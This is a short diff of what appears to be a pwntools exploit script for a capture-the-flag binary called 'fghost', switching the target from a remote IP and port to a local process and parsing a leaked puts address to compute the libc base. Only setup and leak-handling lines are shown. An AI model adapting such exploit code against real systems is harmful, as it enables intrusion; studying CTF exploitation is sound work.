@@ -4,7 +4,7 @@ from pwn import *
 exe = context.binary = ELF(args.EXE or './fghost')
 libc = ELF(exe.libc.path)
 
-io = remote("34.252.33.37", 31302)
+io = process(exe.path)
 
 io.recvuntil(b"this: 0x")
 libc.address = int(io.recvline().strip(), 16) - libc.sym.puts
